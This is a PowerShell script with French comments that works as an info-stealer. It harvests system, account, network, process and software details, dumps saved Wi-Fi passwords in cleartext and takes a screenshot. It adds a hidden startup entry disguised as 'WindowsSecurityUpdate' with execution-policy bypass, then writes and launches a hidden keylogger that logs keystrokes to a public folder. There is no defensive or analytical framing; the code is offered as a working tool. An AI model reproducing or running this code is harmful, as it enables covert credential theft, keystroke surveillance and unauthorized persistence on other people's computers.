$ErrorActionPreference = "SilentlyContinue"

$OutputPath = "C:\Users\Public\collected_data"
New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null

# === 1. INFOS SYSTEME ===
$system = @{
    Hostname        = $env:COMPUTERNAME
    Username        = $env:USERNAME
    Domain          = $env:USERDOMAIN
    OS              = (Get-WmiObject Win32_OperatingSystem).Caption
    OS_Version      = (Get-WmiObject Win32_OperatingSystem).Version
    Architecture    = $env:PROCESSOR_ARCHITECTURE
    Date            = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

$system | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\system.json" -Encoding UTF8

# === 2. UTILISATEURS LOCAUX ===
Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled, PasswordChangeable, PasswordExpires, PasswordRequired, SID | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\users.json" -Encoding UTF8

# === 3. RESEAUX ET IP ===
Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address, NetIPv4Interface | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\network.json" -Encoding UTF8

# === 4. MOTS DE PASSE WIFI ===
$wifiProfiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object { ($_ -split ":")[1].Trim() }
$wifiResults = @()

foreach ($profile in $wifiProfiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $key = ($details | Select-String "Contenu de la clé|Key Content") | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifiResults += @{
        SSID     = $profile
        Password = $key
    }
}

$wifiResults | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\wifi_passwords.json" -Encoding UTF8

# === 5. PROCESSUS ===
Get-Process | Select-Object Name, Id, Path, Company, CPU | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\processes.json" -Encoding UTF8

# === 6. PROGRAMMES INSTALLES ===
$programs = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$programs += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$programs | Where-Object { $_.DisplayName } | ConvertTo-Json -Depth 4 | Out-File "$OutputPath\programs.json" -Encoding UTF8

# === 7. HISTORIQUE NAVIGATEUR (Chrome/Edge simple) ===
$historyData = @()

$chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$edgeHistory   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"

if (Test-Path $chromeHistory) {
    $historyData += "Chrome history found at: $chromeHistory"
}
if (Test-Path $edgeHistory) {
    $historyData += "Edge history found at: $edgeHistory"
}

$historyData | Out-File "$OutputPath\browser_history.txt" -Encoding UTF8

# === 8. CAPTURE D'ECRAN ===
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save("$OutputPath\screenshot.png")
$graphics.Dispose()
$bitmap.Dispose()

# === 9. PERSISTENCE ===
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $path -Name "WindowsSecurityUpdate" -Value "powershell.exe -w hidden -ep bypass -File C:\Users\Public\p.ps1" -Force

# === 10. KEYLOGGER SEPARE ===
$keylogScript = @'
Add-Type -Name U -Namespace W -MemberDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);'
while ($true) {
    Start-Sleep -Milliseconds 30
    for ($i=9; $i -le 254; $i++) {
        if ([W.U]::GetAsyncKeyState($i) -eq -32767) {
            $key = [char]$i
            Add-Content -Path "C:\Users\Public\keylog.txt" -Value $key -NoNewline
        }
    }
}
'@

$keylogScript | Out-File "C:\Users\Public\keylogger.ps1" -Encoding UTF8
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -File C:\Users\Public\keylogger.ps1"

Write-Output "[+] Collection terminee"